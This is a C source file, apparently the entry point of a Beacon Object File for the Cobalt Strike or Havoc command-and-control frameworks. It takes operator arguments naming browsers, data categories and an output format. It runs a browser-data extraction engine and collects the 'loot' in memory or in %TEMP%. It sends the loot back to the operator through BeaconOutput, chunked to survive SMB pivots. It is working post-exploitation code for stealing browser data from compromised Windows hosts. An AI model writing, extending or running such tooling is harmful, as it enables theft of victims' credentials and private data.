/* bof/entry.c - Beacon Object File entry point (go()).
 * Usage (from Havoc `coffloader` / CS `beacon> `):
 *
 *   browserdata <browser|all> <categories|all> <json|csv> [verbose] [save]
 *
 *   verbose : 0 = readable rows only, 1 = also stream full JSON/CSV
 *   save    : 0 = memory only (no files written) [default]
 *             1 = write loot files to %TEMP%\hbd
 *
 * All output (status lines + loot dumps) is buffered into one string builder
 * and flushed in a SINGLE BeaconOutput at the end, so the operator gets one
 * neatly formatted package instead of a spray of tiny chunks. */
#include "../common/beacon.h"
#include "../core/bd.h"

#define OUT_FLUSH_THRESHOLD 60000   /* stay under SMB PIPE_BUFFER_MAX (64K) */

/* status/summary line: ensure it sits on its own line (prepend a newline if
 * the previous buffered output didn't end with one, e.g. after a JSON dump),
 * then terminate with a newline. */
static void bof_log(void *ctx, const char *fmt, ...) {
    bd_sb *sb = (bd_sb *)ctx;
    char buf[1024];
    va_list ap;
    extern int _vsnprintf(char *, size_t, const char *, va_list);
    va_start(ap, fmt);
    _vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    buf[sizeof(buf) - 1] = 0;
    if (sb->len && sb->buf[sb->len - 1] != '\n')
        bd_sb_put(sb, "\n");
    bd_sb_put(sb, buf);
    bd_sb_put(sb, "\n");
}

/* inline loot dump (human-readable rows + JSON/CSV): append verbatim; the
 * engine already supplies its own newlines for human rows. */
static void bof_chunk(void *ctx, const char *data, int len) {
    bd_sb *sb = (bd_sb *)ctx;
    if (len > 0) bd_sb_cat(sb, data, (size_t)len);
}

static void bof_flush(bd_sb *sb) {
    size_t off = 0;
    if (sb->len <= OUT_FLUSH_THRESHOLD) {
        if (sb->len) BeaconOutput(CALLBACK_OUTPUT, sb->buf, (int)sb->len);
        return;
    }
    /* only huge multi-hundred-KB dumps reach here; chunk well under 64K so
     * SMB pivots don't drop the package. Normal runs are a single packet. */
    while (off < sb->len) {
        size_t take = sb->len - off;
        if (take > OUT_FLUSH_THRESHOLD) take = OUT_FLUSH_THRESHOLD;
        BeaconOutput(CALLBACK_OUTPUT, sb->buf + off, (int)take);
        off += take;
    }
}

void go(char *args, int alen) {
    formatp f;
    char *brKey, *catSpec, *fmtSpec;
    int verbose, save;
    int catMask, fmt = BD_FMT_JSON;
    bd_out out;
    bd_sb sb;
    int files;
    char *outdir;

    BeaconDataParse(&f, args, alen);
    brKey   = BeaconDataExtract(&f, NULL);   /* NUL-terminated */
    catSpec = BeaconDataExtract(&f, NULL);
    fmtSpec = BeaconDataExtract(&f, NULL);
    verbose = BeaconDataInt(&f);
    save    = BeaconDataInt(&f);             /* 0 = memory only, 1 = write files */

    if (fmtSpec && (fmtSpec[0] == 'c' || fmtSpec[0] == 'C'))
        fmt = BD_FMT_CSV;

    catMask = bd_cat_mask_parse(catSpec);

    /* memory-only by default; only touch %TEMP% when the operator asks to save */
    outdir = save ? bd_temp_dir() : NULL;
    if (save && !outdir) {
        BeaconPrintf(CALLBACK_ERROR, "[-] cannot resolve %%TEMP%%");
        return;
    }

    bd_sb_init(&sb);

    out.logf    = bof_log;
    out.chunk   = bof_chunk;
    out.ctx     = &sb;
    out.outDir  = outdir;
    out.fmt     = fmt;
    out.verbose = verbose;   /* verbose=1 additionally streams the full JSON/CSV */
    out.human   = 1;         /* always emit one readable row per record        */

    files = bd_run(brKey && brKey[0] ? brKey : "all", catMask, &out, NULL);

    bof_flush(&sb);   /* one output package */
    bd_sb_free(&sb);

    if (files < 0)
        BeaconPrintf(CALLBACK_ERROR, "[-] extraction failed");
}
